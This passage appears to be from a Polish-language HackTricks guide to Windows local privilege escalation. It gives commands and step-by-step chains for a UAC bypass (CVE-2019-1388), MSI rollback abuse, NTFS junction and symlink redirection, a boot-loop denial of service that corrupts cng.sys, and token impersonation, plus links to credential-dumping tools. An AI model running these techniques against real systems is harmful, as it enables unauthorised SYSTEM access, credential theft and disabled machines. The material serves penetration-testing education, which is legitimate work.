Po uzyskaniu shella jako użytkownik mogą być wykonywane zaplanowane zadania lub inne procesy, które **przekazują dane uwierzytelniające w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wykradanie haseł z procesów

## Od użytkownika z niskimi uprawnieniami do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP) i UAC jest włączone, w niektórych wersjach Microsoft Windows można uruchomić terminal lub dowolny inny proces jako „NT\AUTHORITY SYSTEM” z poziomu nieuprzywilejowanego użytkownika.

Umożliwia to jednoczesne eskalowanie uprawnień i ominięcie UAC przy użyciu tej samej luki. Ponadto nie trzeba niczego instalować, a plik binarny wykorzystywany podczas tego procesu jest podpisany i wydany przez Microsoft.

Do systemów, których dotyczy problem, należą między innymi:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od poziomu integralności Medium administratora do High / obejście UAC

Przeczytaj ten tekst, aby **poznać poziomy integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj ten tekst, aby poznać UAC i obejścia UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Łącza katalogów przesyłania w obrębie katalogu udostępnianego przez serwer

Aplikacja może utworzyć przewidywalny podkatalog przesyłania, zapisać w nim plik o nazwie podanej przez użytkownika, a następnie przetworzyć ten plik. Jeśli użytkownik o niskich uprawnieniach może usunąć i zastąpić ten podkatalog łączem NTFS przed zapisem po stronie serwera, zapis może podążyć za łączem do katalogu udostępnianego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z uprawnieniami konta usługi WWW, jeśli serwer wykonuje pliki tego typu. To specyficzna dla aplikacji granica dowolnego zapisu; sam zapisywalny katalog przesyłania ani istniejące łącze nie stanowią dowodu.

Sprawdź dokładny sposób konstruowania ścieżki i moment zapisu w procedurze obsługi przesyłania, efektywne uprawnienia użytkownika do usuwania i tworzenia podkatalogu, efektywne listy ACL miejsca docelowego, to, czy proces zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w tym miejscu. Osobno potwierdź tożsamości procesów zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać listy ACL katalogów i metadane punktów ponownej analizy, ale nie pozwala ustalić zachowania procedury obsługi ani przyszłej podmiany łącza. Jeśli wykonanie odbywa się w kontekście konta usługi, przed rozważeniem osobnej ścieżki wykorzystującej uprawnienia tokenu sprawdź **rzeczywisty token procesu**.

## Od dowolnego usuwania/przenoszenia/zmiany nazwy folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), z kodem exploita [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na wykorzystaniu funkcji wycofywania zmian Windows Installer do zastępowania legalnych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia folderu `C:\Config.Msi`. Windows Installer będzie później używać go do przechowywania plików wycofywania zmian podczas odinstalowywania innych pakietów MSI. Pliki wycofywania zmian zostaną zmodyfikowane tak, aby zawierały złośliwy payload.

Podsumowanie techniki:

1. **Etap 1 – Przygotowanie do przejęcia (pozostawienie pustego `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz instalator jako **„UAC Compliant”**, aby mógł go uruchomić **użytkownik niebędący administratorem**.
    - Po instalacji pozostaw otwarty **handle** do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe do wycofywania zmian).
    - **Odpytuj otwarty handle pliku** za pomocą `GetFinalPathNameByHandle`, aby wykryć, kiedy plik zmieni się w `C:\Config.Msi\<random>.rbf`.

- Krok 3: Synchronizacja niestandardowa
    - Plik `.msi` zawiera **niestandardową akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie, zanim będzie kontynuować odinstalowywanie.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — **uniemożliwia to jego usunięcie**.
    - Następnie **odeślij sygnał**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **folder `C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Ty (atakujący) ręcznie usuwasz plik `.rbf`.
    - Teraz **folder `C:\Config.Msi` jest pusty** i gotowy do przejęcia.

> W tym momencie **uruchom podatność umożliwiającą usunięcie dowolnego folderu z uprawnieniami SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Zastępowanie skryptów wycofywania zmian złośliwymi**

- Krok 6: Odtwórz `C:\Config.Msi` ze słabymi listami ACL
    - Odtwórz samodzielnie folder `C:\Config.Msi`.
    - Ustaw **słabe listy DACL** (np. Everyone:F) i **pozostaw otwarty handle** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, podając:
        - `TARGETDIR`: zapisywalną lokalizację.
        - `ERROROUT`: zmienną, która spowoduje wymuszone niepowodzenie.
    - Ta instalacja posłuży do ponownego uruchomienia **wycofywania zmian**, które odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pojawienie się pliku `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi`, aż pojawi się nowy plik `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizuj przed wycofaniem zmian
    - Plik `.msi` zawiera **niestandardową akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje utworzenie pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie ustaw słabe listy ACL
    - Po otrzymaniu zdarzenia `rbs created`:
        - Windows Installer **ponownie ustawia silne listy ACL** dla `C:\Config.Msi`.
        - Ponieważ nadal masz handle z uprawnieniem `WRITE_DAC`, możesz **ponownie ustawić słabe listy ACL**.

> Listy ACL są **egzekwowane tylko podczas otwierania handle’a**, więc nadal możesz zapisywać w folderze.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Nadpisz plik `.rbs` **fałszywym skryptem wycofywania zmian**, który każe Windows:
        - Przywrócić twój plik `.rbf` (złośliwą bibliotekę DLL) w **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwy payload DLL działający z uprawnieniami SYSTEM**.

- Krok 12: Uruchom wycofywanie zmian
    - Zasygnalizuj zdarzenie synchronizacji, aby instalator wznowił działanie.
    - **Niestandardowa akcja typu 19 (`ErrorOut`)** jest skonfigurowana tak, aby **celowo zakończyć instalację niepowodzeniem** w znanym momencie.
    - To powoduje rozpoczęcie **wycofywania zmian**.

- Krok 13: SYSTEM instaluje twoją bibliotekę DLL
    - Windows Installer:
        - Odczytuje twój złośliwy plik `.rbs`.
        - Kopiuje twoją bibliotekę DLL `.rbf` do lokalizacji docelowej.
    - Masz teraz **złośliwą bibliotekę DLL w ścieżce, z której ładuje ją SYSTEM**.

- Ostatni krok: Uruchom kod jako SYSTEM
    - Uruchom zaufany **automatycznie podwyższający uprawnienia plik binarny** (np. `osk.exe`), który załaduje przejętą przez ciebie bibliotekę DLL.
    - **I gotowe**: twój kod zostanie wykonany **jako SYSTEM**.


### Od dowolnego usuwania/przenoszenia/zmiany nazwy pliku do SYSTEM EoP

Główna technika wykorzystująca wycofywanie zmian MSI (opisana powyżej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność pozwala jedynie na **usuwanie dowolnych plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Jeśli więc **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usunie cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do EoP jako SYSTEM
Co, jeśli Twoja primitive nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- Wewnątrz utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Uruchom proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje kontrolę do Twojego callbacka.

4. Krok 4: W callbacku oplock — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - To opróżnia `folder1` bez przerywania działania oplock.
    - Nie usuwaj bezpośrednio `file1.txt` — spowodowałoby to przedwczesne zwolnienie oplock.

- Opcja B: Zamień `folder1` w **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ten atak jest wymierzony w wewnętrzny strumień NTFS przechowujący metadane folderu — jego usunięcie powoduje usunięcie folderu.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM działa dalej i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, tak naprawdę usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` jest usuwany przez SYSTEM.

### Od utworzenia dowolnego folderu do trwałego DoS

Wykorzystaj prymityw umożliwiający **utworzenie dowolnego folderu jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika systemu Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi `cng.sys` działającemu w trybie jądra.
- Jeśli **utworzysz wcześniej w tej lokalizacji folder**, Windows nie będzie mógł załadować właściwego sterownika podczas uruchamiania.
- Następnie Windows próbuje załadować `cng.sys` podczas uruchamiania.
- Napotyka folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje rozruch**.
- **Nie ma mechanizmu awaryjnego ani odzyskiwania** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych i dowiązań symbolicznych OM do dowolnego nadpisania pliku / DoS podczas rozruchu

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty do ścieżki odczytanej z **konfiguracji, którą można zapisywać**, przekieruj tę ścieżkę za pomocą **dowiązań symbolicznych Object Manager + punktów montowania NTFS**, aby zamienić uprzywilejowany zapis w dowolne nadpisanie pliku (nawet **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Wymagania**
- Konfiguracja przechowująca ścieżkę docelową jest zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` i dowiązania symbolicznego pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić uprzywilejowaną lokalizację logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator uruchomi „wyślij testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (parser hex/PE), aby potwierdzić jego uszkodzenie; ponowne uruchomienie systemu wymusi załadowanie przez Windows zmodyfikowanej ścieżki sterownika → **boot loop DoS**. Ta metoda działa też w przypadku każdego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli jego kopia znajduje się w `C:\Windows\System32\cng.sys`, może zostać wczytana jako pierwsza, co czyni ją niezawodnym celem DoS dla uszkodzonych danych.



## **Od High Integrity do System**

### **Nowa usługa**

Jeśli proces działa już z poziomem High Integrity, **ścieżka do SYSTEM** może być prosta: wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia binarnego pliku usługi upewnij się, że jest to prawidłowa usługa albo że plik binarny szybko wykonuje niezbędne działania, ponieważ zostanie zakończony po 20 s, jeśli nie jest prawidłową usługą.

### AlwaysInstallElevated

Z procesu o wysokim poziomie integralności możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell przy użyciu wrappera _**.msi**_.\
[Więcej informacji o używanych kluczach rejestru i sposobie instalowania pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### Wysoki poziom integralności + uprawnienie SeImpersonate do System

**Kod znajdziesz** [**tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do pełnych uprawnień tokenu

Jeśli masz te uprawnienia tokenu (prawdopodobnie znajdziesz je w już działającym procesie o wysokim poziomie integralności), możesz **otworzyć niemal dowolny proces** (z wyjątkiem procesów chronionych) dzięki uprawnieniu SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Ta technika zwykle polega na **wybraniu dowolnego procesu działającego jako SYSTEM ze wszystkimi uprawnieniami tokenu** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokenu_).\
**Przykład kodu wykonującego opisaną technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Tej techniki używa meterpreter do eskalacji uprawnień w `getsystem`. Polega ona na **utworzeniu pipe, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała do tego pipe**. Następnie **serwer**, który utworzył pipe przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes, przeczytaj ten artykuł**](#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**przejścia od wysokiego poziomu integralności do System przy użyciu name pipes, przeczytaj ten artykuł**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć dll**, która jest **ładowana** przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking przydaje się również do tego rodzaju eskalacji uprawnień, a ponadto jest **znacznie łatwiejsze do przeprowadzenia z procesu o wysokim poziomie integralności**, ponieważ będzie on miał **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Więcej o Dll hijacking dowiesz się** [**tutaj**](dll-hijacking/index.html)**.**

### **Od Administrator lub Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE lub NETWORK SERVICE do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wykrywa błędne konfiguracje i wrażliwe pliki (**[**zobacz tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykryto.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wykrywa możliwe błędne konfiguracje i zbiera informacje (**[**zobacz tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wykrywa błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Pobiera zapisane informacje o sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj lokalnie opcji -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Pobiera poświadczenia z Credential Manager. Wykryto.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Testuje zebrane hasła w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS oraz ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowe narzędzie do enumeracji Windows pod kątem eskalacji uprawnień**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane luki umożliwiające eskalację uprawnień (PRZESTARZAŁE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagane uprawnienia administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane luki umożliwiające eskalację uprawnień (wymaga kompilacji przy użyciu VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż do eskalacji uprawnień) (wymaga kompilacji) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Pobiera poświadczenia z wielu programów (precompiled exe na github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wykrywa błędne konfiguracje (precompiled executable na github). Niezalecane. Nie działa poprawnie w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wykrywa możliwe błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa poprawnie w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego wpisu (do poprawnego działania nie wymaga accesschk, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt przy użyciu odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić zainstalowaną wersję .NET na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacja uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows — ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsztaty lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Ataki na Windows: AT to nowa czerń (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień - Windows - Kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacja uprawnień - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing z użyciem makra Word VBA przez SMTP → odszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokenu jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – W pogoni za Silver Fox: kot i mysz w cieniu jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Luka w systemie plików o podwyższonych uprawnieniach w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania symbolic links – użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Powrót do przeszłości. Wykorzystywanie symbolic links w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Koniec RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Rozwiązania zadań z listy kontrolnej C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Przejęcie plików binarnych usług](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie warunków wyścigu CLDFLT i jądra DirectX w celu lokalnej eskalacji uprawnień w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: pełna prymitywa odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Wykorzystywanie dowolnego usuwania plików do eskalacji uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Ataki na WSUS, część 2: CVE-2020-1013, jednodniowa luka umożliwiająca lokalną eskalację uprawnień w Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznawanie Credential Manager i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Delegowanie Kerberos Resource Based Constrained Delegation: gdy zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Wyodrębnianie prywatnych kluczy SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) – część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) – część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
